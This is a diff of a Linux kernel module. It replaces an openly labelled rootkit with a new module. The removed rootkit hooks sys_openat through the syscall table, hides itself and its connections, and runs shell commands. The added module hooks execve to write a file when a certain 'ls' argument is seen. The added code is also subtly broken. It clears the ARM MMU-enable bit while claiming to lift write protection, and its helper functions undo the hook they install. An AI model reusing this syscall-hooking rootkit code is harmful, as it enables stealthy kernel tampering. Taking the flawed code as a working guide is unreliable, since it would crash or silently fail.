@@ -1,101 +1,128 @@
-#include <linux/kernel.h>
-#include <linux/fs.h>
-#include <linux/init.h>
-#include <linux/device.h>
 #include <linux/module.h>
-#include "functions.c"
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/syscalls.h>
+#include <linux/namei.h>
+#include <linux/kallsyms.h>
+#include <linux/slab.h>
+#include <linux/file.h>
 
-// 模块加载、卸载函数定义
-static int __init rootkit_init(void)
+#define TARGET_CMD "ls"
+#define TARGET_ARG "xxx"
+#define OUTPUT_PATH "/data/xx"
+#define OUTPUT_CONTENT "666\n"
+
+// 保存原始的 sys_execve
+static asmlinkage long (*original_execve)(const char __user *filename,
+                                          const char __user *const __user *argv,
+                                          const char __user *const __user *envp);
+
+static asmlinkage long hooked_execve(const char __user *filename,
+                                     const char __user *const __user *argv,
+                                     const char __user *const __user *envp)
 {
-    //获取系统调用表地址
-    real_sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
-    //错误处理
-    if (!real_sys_call_table)
-    {
-        pr_info("sys call table not found");
+    char fname[256];
+    char arg[256];
+    struct file *file;
+    mm_segment_t old_fs;
+
+    // Get the filename
+    if (strncpy_from_user(fname, filename, sizeof(fname)) < 0) {
         return -EFAULT;
     }
-    if (!hide_connect_init(real_sys_call_table))
-    {
-         pr_info("hide_port_init fail!");
-         return -EFAULT;
-    }
-    // //打印出系统调用表地址
-    pr_info("real_sys_call_table: %p", real_sys_call_table);
 
-    // 获取真实的sys_openat函数地址
-    // __NR_openat是openat系统调用的系统调用号,https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
-    real_sys_openat = (void *)real_sys_call_table[__NR_openat];
-    
-    // 关闭写保护，将真实的sys_openat函数地址映射到我们自己写的openat函数地址处，偷梁换柱
-    disable_wp();
-    real_sys_call_table[__NR_openat] = (void *)my_sys_openat;
-    
-    // 恢复现场，打开写保护
-    enable_wp();
-    
-    pr_info("update __NR_openat: %p->%p", real_sys_openat, my_sys_openat);
-
-    // 注册设备
-    major_num = register_chrdev(0, DEVICE_NAME, &rootkit_fo);
-    if (major_num < 0)
-        return major_num;
-
-    // 创建设备响应类模块
-    module_class = class_create(THIS_MODULE, CLASS_NAME);
-    if (IS_ERR(module_class))
-    {
-        unregister_chrdev(major_num, DEVICE_NAME);
-        return PTR_ERR(module_class);
+    // Check if the command is "ls"
+    if (strcmp(fname, "/bin/" TARGET_CMD) == 0 || strcmp(fname, "/system/bin/" TARGET_CMD) == 0) {
+        // Get the first argument
+        if (argv && argv[1] && strncpy_from_user(arg, argv[1], sizeof(arg)) > 0) {
+            // Check if the argument is "xxx"
+            if (strcmp(arg, TARGET_ARG) == 0) {
+                // Write "666" to /data/xx
+                file = filp_open(OUTPUT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if (!IS_ERR(file)) {
+                    old_fs = get_fs();
+                    set_fs(KERNEL_DS);
+                    kernel_write(file, OUTPUT_CONTENT, strlen(OUTPUT_CONTENT), &file->f_pos);
+                    set_fs(old_fs);
+                    filp_close(file, NULL);
+                }
+            }
+        }
     }
 
-    // 创建设备节点
-    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
-    if (IS_ERR(module_device))
-    {
-        class_destroy(module_class);
-        unregister_chrdev(major_num, DEVICE_NAME);
-        return PTR_ERR(module_device);
-    }
-    __file = filp_open(DEVICE_PATH, O_RDWR, 0);
-    if (IS_ERR(__file)) // failed
-    {
-        device_destroy(module_class, MKDEV(major_num, 0));
-        class_destroy(module_class);
-        unregister_chrdev(major_num, DEVICE_NAME);
-        return PTR_ERR(__file);
-    }
-    __inode = file_inode(__file);
-    __inode->i_mode |= 0666;
-    filp_close(__file, NULL);
+    // Call the original execve
+    return original_execve(filename, argv, envp);
+}
 
-    module_info();
-    hide_myself();
-    show_myself();
-    pr_info("Module install successful##!\n");
-    exec_cmd("echo 123 >> /tmp/result.txt");
+// 禁用写保护
+static void disable_wp(unsigned long *addr)
+{
+    unsigned long value;
+    asm volatile("mrs %0, sctlr_el1" : "=r"(value));
+    value &= ~0x1;  // 清除写保护位
+    asm volatile("msr sctlr_el1, %0" : : "r"(value));
+    *addr = (unsigned long)hooked_execve;
+}
+
+// 启用写保护
+static void enable_wp(unsigned long *addr)
+{
+    unsigned long value;
+    asm volatile("mrs %0, sctlr_el1" : "=r"(value));
+    value |= 0x1;  // 设置写保护位
+    asm volatile("msr sctlr_el1, %0" : : "r"(value));
+    *addr = (unsigned long)original_execve;
+}
+
+static int __init lkm_init(void)
+{
+    unsigned long *sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    if (!sys_call_table) {
+        printk(KERN_ERR "Cannot find sys_call_table\n");
+        return -1;
+    }
+
+    // Save the original execve
+    original_execve = (void *)sys_call_table[__NR_execve];
+
+    // Disable write protection on the page
+    disable_wp(&sys_call_table[__NR_execve]);
+
+    // Hook execve
+    sys_call_table[__NR_execve] = (unsigned long)hooked_execve;
+
+    // Enable write protection on the page
+    enable_wp(&sys_call_table[__NR_execve]);
+
+    printk(KERN_INFO "LKM loaded\n");
     return 0;
 }
 
-static void __exit rootkit_exit(void)
+static void __exit lkm_exit(void)
 {
-    // // 模块退出的时候，需要恢复现场，将修改过的地址再改回去
-    disable_wp();
-    real_sys_call_table[__NR_openat] = (void *)real_sys_openat;
-    enable_wp();
-    
-    device_destroy(module_class, MKDEV(major_num, 0));
-    class_destroy(module_class);
-    unregister_chrdev(major_num, DEVICE_NAME);
-    hide_connect_exit(real_sys_call_table);
-    pr_info("Module uninstall successful!\n");
+    unsigned long *sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    if (!sys_call_table) {
+        printk(KERN_ERR "Cannot find sys_call_table\n");
+        return;
+    }
+
+    // Disable write protection on the page
+    disable_wp(&sys_call_table[__NR_execve]);
+
+    // Restore the original execve
+    sys_call_table[__NR_execve] = (unsigned long)original_execve;
+
+    // Enable write protection on the page
+    enable_wp(&sys_call_table[__NR_execve]);
+
+    printk(KERN_INFO "LKM unloaded\n");
 }
 
-// 模块信息声明
+module_init(lkm_init);
+module_exit(lkm_exit);
+
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("ice");
-MODULE_DESCRIPTION("A simple example Rootkit.");
-MODULE_VERSION("1.0");
-module_init(rootkit_init);
-module_exit(rootkit_exit);
+MODULE_AUTHOR("PrintX");
+MODULE_DESCRIPTION("PrintX LKM");
